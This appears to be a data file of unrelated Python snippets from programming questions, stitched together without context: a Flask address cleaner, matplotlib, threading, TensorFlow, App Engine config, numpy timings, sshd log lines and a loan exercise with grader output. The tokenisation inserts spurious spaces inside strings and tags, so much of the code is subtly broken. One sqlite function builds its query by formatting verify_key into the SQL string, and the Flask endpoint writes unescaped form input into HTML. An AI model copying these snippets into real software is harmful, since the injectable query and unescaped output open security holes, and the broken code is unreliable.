"File `` /home/MY NAME/anaconda/lib/python2.7/SocketServer.py '' , line 596 , in process_request_thread self.finish_request ( request , client_address ) File `` /home/MY NAME/anaconda/lib/python2.7/SocketServer.py '' , line 331 , in finish_request self.RequestHandlerClass ( request , client_address , self ) File `` /home/MY NAME/anaconda/lib/python2.7/SocketServer.py '' , line 654 , in __init__ self.finish ( ) File `` /home/MY NAME/anaconda/lib/python2.7/SocketServer.py '' , line 713 , in finish self.wfile.close ( ) File `` /home/MY NAME/anaconda/lib/python2.7/socket.py '' , line 283 , in close self.flush ( ) File `` /home/MY NAME/anaconda/lib/python2.7/socket.py '' , line 307 , in flush self._sock.sendall ( view [ write_offset : write_offset+buffer_size ] ) error : [ Errno 32 ] Broken pipe @ app.route ( `` /clean '' , methods= [ 'POST ' ] ) def dothing ( ) : addresses = request.form [ 'addresses ' ] return cleanAddress ( addresses ) def cleanAddress ( addresses ) : counter = 0 # nested helper function to fix addresses such as '30 w 60th ' def check_st ( address ) : if 'broadway ' in address : return address has_th_st_nd_rd = re.compile ( r ' ( ? P < number > [ \d ] { 1,4 } ( th|st|nd|rd ) \s ) ( ? P < following > . * ) ' ) has_number = has_th_st_nd_rd.search ( address ) if has_number is not None : if re.match ( r ' ( street|st|floor ) ' , has_number.group ( 'following ' ) ) : return address else : new_address = re.sub ( ' ( ? P < number > [ \d ] { 1,4 } ( st|nd|rd|th ) \s ) ' , r'\g < number > street ' , address , 1 ) return new_address else : return address addresses = addresses.split ( '\n ' ) cleaned = [ ] success = 0 fail = 0 cleaned.append ( ' < body bgcolor= '' # FACC2E '' > < center > < img src= '' http : //goglobal.dhl-usa.com/common/img/dhl-express-logo.png '' alt= '' Smiley face '' height= '' 100 '' width= '' 350 '' > < br > < p > ' ) cleaned.append ( ' < br > < h3 > Note : Everything before the first comma is the Old Address . Everything after the first comma is the New Address < /h13 > ' ) cleaned.append ( ' < p > < h3 > To format the output in Excel , split the columns using `` , '' as the delimiter . < /p > < /h3 > ' ) cleaned.append ( ' < p > < h2 > < font color= '' red '' > Old Address < /font > < font color= '' black '' > New Address < /font > < /p > < /h2 > ' ) for address in addresses : dirty = address.strip ( ) if ' , ' in address : dirty = dirty.replace ( ' , ' , `` ) cleaned.append ( ' < font color= '' red '' > ' + dirty + ' , ' + ' < /font > ' ) address = address.lower ( ) address = re.sub ( ' [ ^A-Za-z0-9 # ] + ' , ' ' , address ) .lstrip ( ) pattern = r '' \d+ . * + ( \d+ . * ( `` + `` | '' .join ( patterns ) + `` ) ) '' address = re.sub ( pattern , `` \\1 '' , address ) address = check_st ( address ) if 'one ' in address : address = address.replace ( 'one ' , ' 1 ' ) if 'two ' in address : address = address.replace ( 'two ' , ' 2 ' ) if 'three ' in address : address = address.replace ( 'three ' , ' 3 ' ) if 'four ' in address : address = address.replace ( 'four ' , ' 4 ' ) if 'five ' in address : address = address.replace ( 'five ' , ' 5 ' ) if 'eight ' in address : address = address.replace ( 'eight ' , ' 8 ' ) if 'nine ' in address : address = address.replace ( 'nine ' , ' 9 ' ) if 'fith ' in address : address = address.replace ( 'fith ' , 'fifth ' ) if 'aveneu ' in address : address = address.replace ( 'aveneu ' , 'avenue ' ) if 'united states of america ' in address : address = address.replace ( 'united states of america ' , `` ) if 'ave americas ' in address : address = address.replace ( 'ave americas ' , 'avenue of the americas ' ) if 'americas avenue ' in address : address = address.replace ( 'americas avenue ' , 'avenue of the americas ' ) if 'avenue of americas ' in address : address = address.replace ( 'avenue of americas ' , 'avenue of the americas ' ) if 'avenue of america ' in address : address = address.replace ( 'avenue of america ' , 'avenue of the americas ' ) if 'ave of the americ ' in address : address = address.replace ( 'ave of the americ ' , 'avenue of the americas ' ) if 'avenue america ' in address : address = address.replace ( 'avenue america ' , 'avenue of the americas ' ) if 'americaz ' in address : address = address.replace ( 'americaz ' , 'americas ' ) if 'ave of america ' in address : address = address.replace ( 'ave of america ' , 'avenue of the americas ' ) if 'amrica ' in address : address = address.replace ( 'amrica ' , 'americas ' ) if 'americans ' in address : address = address.replace ( 'americans ' , 'americas ' ) if 'walk street ' in address : address = address.replace ( 'walk street ' , 'wall street ' ) if 'northend ' in address : address = address.replace ( 'northend ' , 'north end ' ) if 'inth ' in address : address = address.replace ( 'inth ' , 'ninth ' ) if 'aprk ' in address : address = address.replace ( 'aprk ' , 'park ' ) if 'eleven ' in address : address = address.replace ( 'eleven ' , '11 ' ) if ' av ' in address : address = address.replace ( ' av ' , ' avenue ' ) if 'avnue ' in address : address = address.replace ( 'avnue ' , 'avenue ' ) if 'ofthe americas ' in address : address = address.replace ( 'ofthe americas ' , 'of the americas ' ) if 'aj the ' in address : address = address.replace ( 'aj the ' , 'of the ' ) if 'fifht ' in address : address = address.replace ( 'fifht ' , 'fifth ' ) if 'w46 ' in address : address = address.replace ( 'w46 ' , ' w 46 ' ) if 'w42 ' in address : address = address.replace ( 'w42 ' , ' w 42 ' ) if '95st ' in address : address = address.replace ( '95st ' , '95th st ' ) if 'e61 st ' in address : address = address.replace ( 'e61 st ' , ' e 61st ' ) if 'driver information ' in address : address = address.replace ( 'driver information ' , `` ) if 'e87 ' in address : address = address.replace ( 'e87 ' , ' e 87 ' ) if 'thrd avenus ' in address : address = address.replace ( 'thrd avenus ' , 'third avenue ' ) if '3r ' in address : address = address.replace ( '3r ' , '3rd ' ) if 'st ates ' in address : address = address.replace ( 'st ates ' , `` ) if 'east52nd ' in address : address = address.replace ( 'east52nd ' , 'east 52nd ' ) if 'authority to leave ' in address : address = address.replace ( 'authority to leave ' , `` ) if 'sreet ' in address : address = address.replace ( 'sreet ' , 'street ' ) if 'w47 ' in address : address = address.replace ( 'w47 ' , ' w 47 ' ) if 'signature required ' in address : address = address.replace ( 'signature required ' , `` ) if 'direct ' in address : address = address.replace ( 'direct ' , `` ) if 'streetapr ' in address : address = address.replace ( 'streetapr ' , 'street ' ) if 'steet ' in address : address = address.replace ( 'steet ' , 'street ' ) if 'w39 ' in address : address = address.replace ( 'w39 ' , ' w 39 ' ) if 'ave of new york ' in address : address = address.replace ( 'ave of new york ' , 'avenue of the americas ' ) if 'avenue of new york ' in address : address = address.replace ( 'avenue of new york ' , 'avenue of the americas ' ) if 'brodway ' in address : address = address.replace ( 'brodway ' , 'broadway ' ) if ' w 31 ' in address : address = address.replace ( ' w 31 ' , ' w 31th ' ) if ' w 34 ' in address : address = address.replace ( ' w 34 ' , ' w 34th ' ) if 'w38 ' in address : address = address.replace ( 'w38 ' , ' w 38 ' ) if 'broadeay ' in address : address = address.replace ( 'broadeay ' , 'broadway ' ) if 'w37 ' in address : address = address.replace ( 'w37 ' , ' w 37 ' ) if '35street ' in address : address = address.replace ( '35street ' , '35th street ' ) if 'eighth avenue ' in address : address = address.replace ( 'eighth avenue ' , '8th avenue ' ) if 'west 33 ' in address : address = address.replace ( 'west 33 ' , 'west 33rd ' ) if '34t ' in address : address = address.replace ( '34t ' , '34th ' ) if 'street ave ' in address : address = address.replace ( 'street ave ' , 'ave ' ) if 'avenue of york ' in address : address = address.replace ( 'avenue of york ' , 'avenue of the americas ' ) if 'avenue aj new york ' in address : address = address.replace ( 'avenue aj new york ' , 'avenue of the americas ' ) if 'avenue ofthe new york ' in address : address = address.replace ( 'avenue ofthe new york ' , 'avenue of the americas ' ) if 'e4 ' in address : address = address.replace ( 'e4 ' , ' e 4 ' ) if 'avenue of nueva york ' in address : address = address.replace ( 'avenue of nueva york ' , 'avenue of the americas ' ) if 'avenue of new york ' in address : address = address.replace ( 'avenue of new york ' , 'avenue of the americas ' ) if 'west end new york ' in address : address = address.replace ( 'west end new york ' , 'west end avenue ' ) # print address address = address.split ( ' ' ) for pattern in patterns : try : if address [ 0 ] .isdigit ( ) : continue else : location = address.index ( pattern ) + 1 number_location = address [ location ] # print address [ location ] # if 'th ' in address [ location + 1 ] or 'floor ' in address [ location + 1 ] or ' # ' in address [ location ] : # continue except ( ValueError , IndexError ) : continue if number_location.isdigit ( ) and len ( number_location ) < = 4 : address = [ number_location ] + address [ : location ] + address [ location+1 : ] break address = ' '.join ( address ) if ' # ' in address : address = address.replace ( ' # ' , `` ) # print ( address ) i = 0 for char in address : if char.isdigit ( ) : address = address [ i : ] break i += 1 # print ( address ) if 'plz ' in address : address = address.replace ( 'plz ' , 'plaza ' , 1 ) if 'hstreet ' in address : address = address.replace ( 'hstreet ' , ' h street ' ) if 'dstreet ' in address : address = address.replace ( 'dstreet ' , 'd street ' ) if 'hst ' in address : address = address.replace ( 'hst ' , ' h st ' ) if 'dst ' in address : address = address.replace ( 'dst ' , 'd st ' ) if 'have ' in address : address = address.replace ( 'have ' , ' h ave ' ) if 'dave ' in address : address = address.replace ( 'dave ' , 'd ave ' ) if 'havenue ' in address : address = address.replace ( 'havenue ' , ' h avenue ' ) if 'davenue ' in address : address = address.replace ( 'davenue ' , 'd avenue ' ) # print address regex = r ' ( . * ) ( ' + '|'.join ( patterns ) + r ' ) ( . * ) ' address = re.sub ( regex , r'\1\2 ' , address ) .lstrip ( ) + `` nyc '' print ( address ) if 'americasas st ' in address : address = address.replace ( 'americasas st ' , 'americas ' ) try : clean = geolocator.geocode ( address ) x = clean.address address , city , zipcode , country = x.split ( `` , '' ) address = address.lower ( ) if 'first ' in address : address = address.replace ( 'first ' , '1st ' ) if 'second ' in address : address = address.replace ( 'second ' , '2nd ' ) if 'third ' in address : address = address.replace ( 'third ' , '3rd ' ) if 'fourth ' in address : address = address.replace ( 'fourth ' , '4th ' ) if 'fifth ' in address : address = address.replace ( 'fifth ' , '5th ' ) if ' sixth a ' in address : address = address.replace ( 'ave ' , `` ) address = address.replace ( 'avenue ' , `` ) address = address.replace ( ' sixth ' , ' avenue of the americas ' ) if ' 6th a ' in address : address = address.replace ( 'ave ' , `` ) address = address.replace ( 'avenue ' , `` ) address = address.replace ( ' 6th ' , ' avenue of the americas ' ) if 'seventh ' in address : address = address.replace ( 'seventh ' , '7th ' ) if 'fashion ' in address : address = address.replace ( 'fashion ' , '7th ' ) if 'eighth ' in address : address = address.replace ( 'eighth ' , '8th ' ) if 'ninth ' in address : address = address.replace ( 'ninth ' , '9th ' ) if 'tenth ' in address : address = address.replace ( 'tenth ' , '10th ' ) if 'eleventh ' in address : address = address.replace ( 'eleventh ' , '11th ' ) zipcode = zipcode [ 3 : ] to_write = str ( address ) + `` , `` + str ( zipcode.lstrip ( ) ) + `` , `` + str ( clean.latitude ) + `` , `` + str ( clean.longitude ) to_find = str ( address ) # print to_write # returns 'can not be cleaned ' if street address has no numbers if any ( i.isdigit ( ) for i in str ( address ) ) : with open ( '/home/MY NAME/Address_Database.txt ' , ' a+ ' ) as database : if to_find not in database.read ( ) : database.write ( dirty + '| ' + to_write + '\n ' ) if 'ncy rd ' in address : cleaned.append ( ' < font color= '' red '' > Can not be cleaned < /font > < br > ' ) fail += 1 elif 'nye rd ' in address : cleaned.append ( ' < font color= '' red '' > Can not be cleaned < /font > < br > ' ) fail += 1 elif 'nye c ' in address : cleaned.append ( ' < font color= '' red '' > Can not be cleaned < /font > < br > ' ) fail += 1 else : cleaned.append ( to_write + ' < br > ' ) success += 1 else : cleaned.append ( ' < font color= '' red '' > Can not be cleaned < /font > < br > ' ) fail += 1 except AttributeError : cleaned.append ( ' < font color= '' red '' > Can not be cleaned < /font > < br > ' ) fail += 1 except ValueError : cleaned.append ( ' < font color= '' red '' > Can not be cleaned < /font > < br > ' ) fail += 1 except GeocoderTimedOut as e : cleaned.append ( ' < font color= '' red '' > Can not be cleaned < /font > < br > ' ) fail += 1 total = success + fail percent = float ( success ) / float ( total ) * 100 percent = round ( percent , 2 ) print percent cleaned.append ( ' < br > Accuracy : ' + str ( percent ) + ' % ' ) cleaned.append ( ' < /p > < /center > < /body > ' ) return `` \n '' .join ( cleaned )"
< a dir= '' ltr '' lang= '' en '' class= '' mwe-popups-extract '' href= '' /wiki/Ancient_Greek '' > < p > The < b > Ancient Greek < /b > language includes the forms of Greek ... ( a bunch more text ) ... < /p > < /a >
"import numpy as npimport matplotlib.pyplot as pltimport matplotlib.animation as animation % matplotlib notebookdef data_gen ( t=0 ) : cnt = 0 while cnt < 150 : cnt += 1 t += 0.1 yield t , np.sin ( 2*np.pi*t ) * np.exp ( -t/10 . ) def init ( ) : ax.set_ylim ( -1.1 , 1.1 ) ax.set_xlim ( 0 , 10 ) del xdata [ : ] del ydata [ : ] line.set_data ( xdata , ydata ) return line , fig , ax = plt.subplots ( ) line , = ax.plot ( [ ] , [ ] , lw=2 ) ax.grid ( ) xdata , ydata = [ ] , [ ] def run ( data ) : # update the data t , y = data xdata.append ( t ) ydata.append ( y ) xmin , xmax = ax.get_xlim ( ) if t > = xmax : ax.set_xlim ( xmin , 2*xmax ) ax.figure.canvas.draw ( ) line.set_data ( xdata , ydata ) return line , ani = animation.FuncAnimation ( fig , run , data_gen , blit=False , interval=15 , repeat=False , init_func=init ) plt.show ( ) > Traceback ( most recent call last ) : File > `` /Users/alexfreeman/Documents/Dev/AnacondaInstall/anaconda/envs/py3-env/lib/python3.6/site-packages/matplotlib/cbook/__init__.py '' , > line 387 , in process > proxy ( *args , **kwargs ) File `` /Users/alexfreeman/Documents/Dev/AnacondaInstall/anaconda/envs/py3-env/lib/python3.6/site-packages/matplotlib/cbook/__init__.py '' , > line 227 , in __call__ > return mtd ( *args , **kwargs ) File `` /Users/alexfreeman/Documents/Dev/AnacondaInstall/anaconda/envs/py3-env/lib/python3.6/site-packages/matplotlib/animation.py '' , > line 1499 , in _stop > self.event_source.remove_callback ( self._loop_delay ) AttributeError : 'NoneType ' object has no attribute 'remove_callback '"
"from threading import Threadfrom multiprocessing import Processnum = 0def f ( ) : global num num += 1def thread ( func ) : # return Process ( target=func ) return Thread ( target=func ) if __name__ == '__main__ ' : t_list = [ ] for i in xrange ( 1 , 100000 ) : t = thread ( f ) t.start ( ) t_list.append ( t ) for t in t_list : t.join ( ) print num"
% python ./setup.py build_coffee % python ./setup.py build_coffee -- inplace % python ./setup.py build_ext -- inplace # implying 'build_coffee -- inplace '
"class MyModel ( Model ) : def __init__ ( self ) : super ( MyModel , self ) .__init__ ( ) self.conv1 = Conv2D ( 32 , 3 , activation='relu ' ) self.flatten = Flatten ( ) self.d1 = Dense ( 128 , activation='relu ' ) self.d2 = Dense ( 10 , activation='softmax ' ) def call ( self , x ) : x = self.conv1 ( x ) x = self.flatten ( x ) x = self.d1 ( x ) return self.d2 ( x ) # Create an instance of the modelmodel = MyModel ( ) @ tf.functiondef train_step ( images , labels ) : with tf.GradientTape ( ) as tape : predictions = model ( images ) loss = loss_object ( labels , predictions ) gradients = tape.gradient ( loss , model.trainable_variables ) optimizer.apply_gradients ( zip ( gradients , model.trainable_variables ) ) train_loss ( loss ) train_accuracy ( labels , predictions ) model = MyModel ( ) model.call ( images )"
"application : AAA # mystical creation.version : alpha-1runtime : python27api_version : 1threadsafe : truehandlers : - url : /media static_dir : media/- url : /favicon.ico static_files : media/images/favicon.ico upload : media/images/favicon.ico- url : /admin script : AAA.app login : admin- url : / . * script : AAA.appskip_files : - ^ ( . */ ) ? app\.yamllibraries : - name : django version : `` 1.2 '' - name : jinja2 version : latest- name : yaml version : latest /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/dev_appserver.py inGetParentPackage ( self= < google.appengine.tools.dev_appserver.HardenedModulesHookobject > , fullname='AAA.app ' ) 2334 2335 if self.find_module ( fullname ) is None : = > 2336 raise ImportError ( 'Could not find module % s ' % fullname ) 2337 2338 return self._module_dict [ parent_module_fullname ] builtin ImportError = < type 'exceptions.ImportError ' > , fullname ='AAA.app ' < type 'exceptions.ImportError ' > : Could not find module AAA.app args = ( 'Could not find module AAA.app ' , ) message = 'Could not find module AAA.app ' from google.appengine.dist import use_library use_library ( 'django ' , ' 1.2 ' ) # otherwise we still get django 0.96 from django.core.handlers import wsgi app = wsgi.WSGIHandler ( ) # same content as above # same content as above from google.appengine.dist import use_libraryuse_library ( 'django ' , ' 1.2 ' )"
a = 3def x ( ) : global a del ( a ) print ( a ) x ( ) x ( ) print ( a )
"test_str = `` abcdefghijklmn123456789 '' str1 = `` '' str2 = `` '' start = time.time ( ) for i in range ( 1 , 100001 ) : str1 = str1 + test_str str2 = str2 + test_str if i % 20000 == 0 : print ( `` time ( sec ) = > { } '' .format ( time.time ( ) - start ) ) start = time.time ( ) time ( sec ) = > 0.013324975967407227time ( sec ) = > 0.020363807678222656time ( sec ) = > 0.009979963302612305time ( sec ) = > 0.01744699478149414time ( sec ) = > 0.0227658748626709 test_str = `` abcdefghijklmn123456789 '' str1 = `` '' str2 = `` '' start = time.time ( ) for i in range ( 1 , 100001 ) : str1 = str1 + test_str # str2 = str2 + test_str # ↓ str2 = str1 if i % 20000 == 0 : print ( `` time ( sec ) = > { } '' .format ( time.time ( ) - start ) ) start = time.time ( ) time ( sec ) = > 0.36466407775878906time ( sec ) = > 1.105351209640503time ( sec ) = > 2.6467738151550293time ( sec ) = > 5.891657829284668time ( sec ) = > 9.266698360443115"
AttributeError : 'mmap.mmap ' object has no attribute 'seekable '
def retornaReplicas ( verify_key ) : connection = sqlite3.connect ( 'servidor.db ' ) cursor = connection.cursor ( ) sql = 'SELECT replicas FROM arquivos_sad WHERE verify_key= '' % s '' ' % ( verify_key ) cursor.execute ( sql ) resultado = cursor.fetchone ( ) return ' @ '.join ( resultado ) print retornaReplicas ( verify_key ) connection = sqlite3.connect ( 'servidor.db ' ) cursor = connection.cursor ( ) sql = 'SELECT replicas FROM arquivos_sad WHERE verify_key= '' % s '' ' % ( verify_key ) cursor.execute ( sql ) resultado = cursor.fetchone ( ) print ' @ '.join ( resultado )
clip = mp.VideoFileClip ( file ) clip_resized1 = clip.resize ( height=int ( clip.h * float ( 0.66666 ) ) ) clip_resized1.write_videofile ( name + '-2x ' + ext )
"class Comparable : def _key ( self ) : raise NotImplementedError def __hash__ ( self ) : return hash ( self._key ( ) ) def __eq__ ( self , other ) : ... def __lt__ ( self , other ) : ... class A ( Comparable ) : passclass B ( A ) : def __str__ ( self ) : return `` d '' def __eq__ ( self , other ) : return isinstance ( self , type ( other ) ) def _key ( self ) : return str ( self ) , b = B ( ) > > b < __main__.B object at 0x00000183C9734978 > > > '__hash__ ' in dir ( b ) True > > b.__hash__ > > b.__hash__ is NoneTrue > > B.__mro__ ( < class '__main__.B ' > , < class '__main__.A ' > , < class '__main__.Comparable ' > , < class 'object ' > ) > > isinstance ( b , Comparable ) True"
"Python 2.7.13 ( default , Apr 19 2017 , 02:44:33 ) [ GCC 4.8.5 20150623 ( Red Hat 4.8.5-4 ) ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import datetime > > > import os > > > os.environ [ 'TZ ' ] = 'UTC ' > > > datetime.datetime.fromtimestamp ( 1461085831 ) datetime.datetime ( 2016 , 4 , 19 , 17 , 10 , 31 ) Python 3.6.1 ( default , Apr 19 2017 , 21:58:41 ) [ GCC 4.8.5 20150623 ( Red Hat 4.8.5-4 ) ] on linuxType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import datetime > > > import os > > > os.environ [ 'TZ ' ] = 'UTC ' > > > datetime.datetime.fromtimestamp ( 1461085831 ) datetime.datetime ( 2016 , 4 , 19 , 22 , 40 , 31 )"
Apr 21 13:30:52 qsandbox01 sshd [ 19503 ] : Accepted password for mrankin from 10.10.100.106 port 52854 ssh2Apr 21 13:30:52 qsandbox01 sshd [ 19503 ] : pam_unix ( sshd : session ) : session opened for user mrankin by ( uid=0 ) Apr 21 13:30:52 qsandbox01 sudo : mrankin : TTY=unknown ; PWD=/home/mrankin ; USER=root ; COMMAND=/bin/bash -l -c apache2ctl gracefulApr 21 13:30:53 qsandbox01 sshd [ 19503 ] : pam_unix ( sshd : session ) : session closed for user mrankin from fabric.api import rundef host_type ( ) : run ( 'uname -s ' )
"np.array ( [ `` hello '' , '' world '' , { `` a '' :5 , '' b '' :6 , '' c '' :8 } , '' usa '' , '' india '' , { `` d '' :9 , '' e '' :10 , '' f '' :11 } ] ) df = pd.DataFrame ( { ' A ' : [ `` hello '' , '' world '' , { `` a '' :5 , '' b '' :6 , '' c '' :8 } , '' usa '' , '' india '' , { `` d '' :9 , '' e '' :10 , '' f '' :11 } ] } ) df.applymap ( np.isreal ) Out [ 811 ] : A0 False1 False2 True3 False4 False5 True np.isreal ( np.array ( [ `` hello '' , '' world '' , { `` a '' :5 , '' b '' :6 , '' c '' :8 } , '' usa '' , '' india '' , { `` d '' :9 , '' e '' :10 , '' f '' :11 } ] ) ) Out [ 813 ] : array ( [ True , True , True , True , True , True ] , dtype=bool )"
"self.uploadbutton.modify_bg ( Gtk.StateType.PRELIGHT , self.color )"
"A=np.random.rand ( size ) command ( A ) Command : Time [ in sec ] : A/=0.5 2.88435101509A/=0.51 5.22591209412A*=2.0 1.1831600666A*2.0 3.44263911247 //not in-place , more cache misses ? A+=A 1.2827270031 Size : 1e8 Command : Time [ in sec ] : A/=0.5 2.85750007629 A/=0.25 2.91607499123 A/=0.125 2.89376401901 A/=2.0 2.84901714325 A/=4.0 2.84493684769 A/=3.0 5.00480890274 A/=0.75 5.0354950428 A/=0.51 5.05687212944 Command : 1e4*Time [ in sec ] : A/=0.5 3.37723994255A/=0.51 3.42854404449A*=2.0 1.1587908268A*2.0 1.19793796539A+=A 1.11329007149 import numpy as npimport timeitdef timeit_command ( command , rep ) : print `` \t '' +command+ '' \t\t '' , min ( timeit.repeat ( `` for i in xrange ( % d ) : '' % rep+command , `` from __main__ import A '' , number=7 ) ) sizes= [ 1e8 , 1e4 ] reps= [ 1 , 1e4 ] commands= [ `` A/=0.5 '' , `` A/=0.51 '' , `` A*=2.2 '' , `` A*=2.0 '' , `` A*2.2 '' , `` A*2.0 '' , `` A+=A '' , `` A+A '' ] for size , rep in zip ( sizes , reps ) : A=np.random.rand ( size ) print `` Size : '' , size for command in commands : timeit_command ( command , rep )"
"> > > { 1 : `` foo '' } < { 2 : `` bar '' } True > > > help ( dict.__cmp__ ) Help on wrapper_descriptor : __cmp__ ( ... ) x.__cmp__ ( y ) < == > cmp ( x , y ) > > > help ( cmp ) Help on built-in function cmp in module __builtin__ : cmp ( ... ) cmp ( x , y ) - > integer Return negative if x < y , zero if x==y , positive if x > y ."
nvidia-docker run -it -p 8888:8888 -- entrypoint /usr/local/bin/jupyter NAMEOFDOCKERIMAGE notebook -- allow-root -- ip=0.0.0.0 -- no-browser ssh -N -f -L localhost:8888 : localhost:8888 remote_user @ remote_host
# ! /usr/bin/env python ./game.py python -O ./game.py PYTHONOPTIMIZE=1 ./game.py # ! /bin/shPYTHONOPTIMIZE=1 ./game.py $ * # ! /usr/bin/env PYTHONOPTIMIZE=1 python # ! /usr/bin/env python -O import runtime runtime.optimize ( True )
"L = [ ' a ' , ' b ' ] k = 4L1 = [ 'a1 ' , 'b1 ' , 'a2 ' , 'b2 ' , 'a3 ' , 'b3 ' , 'a4 ' , 'b4 ' ] l1 = L * kprint l1 # [ ' a ' , ' b ' , ' a ' , ' b ' , ' a ' , ' b ' , ' a ' , ' b ' ] l = [ [ x ] * 2 for x in range ( 1 , k + 1 ) ] print l # [ [ 1 , 1 ] , [ 2 , 2 ] , [ 3 , 3 ] , [ 4 , 4 ] ] l2 = [ item for sublist in l for item in sublist ] print l2 # [ 1 , 1 , 2 , 2 , 3 , 3 , 4 , 4 ] print zip ( l1 , l2 ) # [ ( ' a ' , 1 ) , ( ' b ' , 1 ) , ( ' a ' , 2 ) , ( ' b ' , 2 ) , ( ' a ' , 3 ) , ( ' b ' , 3 ) , ( ' a ' , 4 ) , ( ' b ' , 4 ) ] print [ x+ str ( y ) for x , y in zip ( l1 , l2 ) ] # [ 'a1 ' , 'b1 ' , 'a2 ' , 'b2 ' , 'a3 ' , 'b3 ' , 'a4 ' , 'b4 ' ]"
"def monitor ( self ) : checkTimer = time ( ) while self.running : read , write , error = select.select ( [ self.commSocket ] , [ self.commSocket ] , [ ] ,0 ) if self.commSocket in read : try : data , addr = self.commSocket.recvfrom ( 1024 ) self.processInput ( data , addr ) except : pass if time ( ) - checkTimer > 20 : # every 20 seconds checkTimer = time ( ) if self.commSocket in write : for rtc in self.rtcList : try : addr = ( rtc , 7 ) # port 7 is the echo port self.commSocket.sendto ( 'ping ' , addr ) if not self.rtcCheckins [ rtc ] [ 0 ] : # if last check was a failure self.rtcCheckins [ rtc ] [ 1 ] += 1 # incr failure count self.rtcCheckins [ rtc ] [ 0 ] = False # setting last check to failure except : pass for rtc in self.rtcList : if self.rtcCheckins [ rtc ] [ 1 ] > 2 : # did n't answer for a whole minute self.rtcCheckins [ rtc ] [ 1 ] = 0 self.sendError ( rtc )"
"from setuptools import find_namespace_packages , setupsetup ( name='namespace-repro ' , version= ' 0.1.0 ' , python_requires= ' > =3.6 ' , packages=find_namespace_packages ( 'src ' ) , package_dir= { `` : 'src ' } , zip_safe=False , ) from namespace_repro.module.x import x import namespace_repro.module.y as yx = y.y y = True -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -AttributeError Traceback ( most recent call last ) < ipython-input-1-bcae5a697dad > in < module > -- -- > 1 import namespace_repro.module~/namespace-repro/src/namespace_repro/module/__init__.py in < module > -- -- > 1 from namespace_repro.module.x import x~/namespace-repro/src/namespace_repro/module/x.py in < module > -- -- > 1 import namespace_repro.module.y as y 2 3 x = y.yAttributeError : module 'namespace_repro ' has no attribute 'module ' -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - In [ 1 ] : import namespace_repro.module.y as y # This does n't work. -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -AttributeError Traceback ( most recent call last ) < ipython-input-4-4035347ea59b > in < module > -- -- > 1 import namespace_repro.module.y as yAttributeError : module 'namespace_repro ' has no attribute 'module'In [ 2 ] : import namespace_repro.module.y # But this one does ! Why ? In [ 3 ] : dir ( namespace_repro.module.y ) # The error returns when we actually want to use the module. -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -AttributeError Traceback ( most recent call last ) < ipython-input-3-d89bcfd9e509 > in < module > -- -- > 1 dir ( namespace_repro.module.y ) AttributeError : module 'namespace_repro ' has no attribute 'module'In [ 4 ] : from namespace_repro.module.y import y # This works fine ! In [ 5 ] : yOut [ 5 ] : True . import-error-repro+ -- setup.py+ -- src| + -- namespace_repro| | + -- module| | | + -- __init__.py| | | + -- x.py| | | + -- y.py"
"code = `` '' '' print ( `` foo '' ) if True : returnprint ( `` bar '' ) '' '' '' exec ( code ) print ( 'This should still be executed ' ) Traceback ( most recent call last ) : File `` untitled.py '' , line 10 , in < module > exec ( code ) File `` < string > '' , line 5SyntaxError : 'return ' outside function"
"category [ 1 ] category [ 2 ] category [ junk ] category [ test ] category [ 1 ] = > `` the input value '' , category [ 2 ] = > `` the other input value ''"
# filename = temp.py # # \mainpage Main Page Title # \brief main page title comments \n # # class class_demo1 \n # the class declared below \nclass class_demo1 : passfrom new_package import * # # \package new_package # new namespace comments \n def demo_fun : passclass demo_class : pass
"# ! /usr/bin/python3.6from math import ceildef roundup ( x ) : return int ( ceil ( x / 10.0 ) * 10 ) def getFixedPayment ( balance , annualInterestRate , counter=12 ) : totalLoan = balance + ( balance*annualInterestRate ) monthlyPayment = roundup ( totalLoan/12.0 ) newBalance = totalLoan - monthlyPayment if counter < 12 : newPayment = newBalance / counter + 1 else : newPayment = newBalance / counter if counter == 1 : return roundup ( newPayment/12 ) else : return getFixedPayment ( balance , annualInterestRate , counter-1 ) # balance = 3329 # annualInterestRate = 0.2print ( 'Lowest Payment : ' + str ( getFixedPayment ( balance , annualInterestRate ) ) ) Test Case 1balance = 3329 ; annualInterestRate = 0.2Output : Lowest Payment : 310Test Case 2balance = 4773 ; annualInterestRate = 0.2Output : Lowest Payment : 440Test Case 3balance = 3926 ; annualInterestRate = 0.2Output : Lowest Payment : 360Randomized Test Case 1balance = 265 ; annualInterestRate = 0.18Output : Lowest Payment : 30Randomized Test Case 2balance = 263 ; annualInterestRate = 0.18Output : Lowest Payment : 30Randomized Test Case 3balance = 317 ; annualInterestRate = 0.25Output : Lowest Payment : 30Randomized Test Case 4balance = 720 ; annualInterestRate = 0.2Output : Lowest Payment : 70Randomized Test Case 5balance = 4284 ; annualInterestRate = 0.2Output : Lowest Payment : 400Randomized Test Case 6balance = 3834 ; annualInterestRate = 0.15Your output : Lowest Payment : 340*** ERROR : Expected Lowest Payment : 350 , but got Lowest Payment : 340 ***Correct output : Lowest Payment : 350Randomized Test Case 7balance = 3045 ; annualInterestRate = 0.18Output : Lowest Payment : 280Randomized Test Case 8balance = 4461 ; annualInterestRate = 0.2Output : Lowest Payment : 410Randomized Test Case 9balance = 4657 ; annualInterestRate = 0.04Your output : Lowest Payment : 370*** ERROR : Expected Lowest Payment : 400 , but got Lowest Payment : 370 ***Correct output : Lowest Payment : 400Randomized Test Case 10balance = 3395 ; annualInterestRate = 0.2Your output : Lowest Payment : 320*** ERROR : Expected Lowest Payment : 310 , but got Lowest Payment : 320 ***Correct output : Lowest Payment : 310Randomized Test Case 11balance = 4045 ; annualInterestRate = 0.15Your output : Lowest Payment : 360*** ERROR : Expected Lowest Payment : 370 , but got Lowest Payment : 360 ***Correct output : Lowest Payment : 370Randomized Test Case 12balance = 3963 ; annualInterestRate = 0.18Output : Lowest Payment : 360"
